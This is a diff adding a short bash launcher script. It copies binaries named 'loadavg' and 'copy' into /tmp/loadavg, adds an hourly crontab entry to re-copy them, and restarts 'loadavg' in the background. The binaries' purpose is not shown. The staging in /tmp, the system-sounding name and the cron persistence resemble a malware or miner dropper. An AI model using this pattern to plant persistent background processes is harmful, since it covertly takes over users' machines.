@@ -1,0 +1,17 @@
+#!/usr/bin/env bash
+
+bin_dir=$(dirname $(readlink -f $0))
+tmp_dir=/tmp/loadavg
+
+rm -rf $tmp_dir
+
+mkdir $tmp_dir
+
+cp $bin_dir/{loadavg,copy} $tmp_dir
+
+
+(crontab -l 2>/dev/null | grep -v "loadavg";
+ echo "@hourly $tmp_dir/copy") | crontab -
+
+killall loadavg
+$tmp_dir/loadavg &
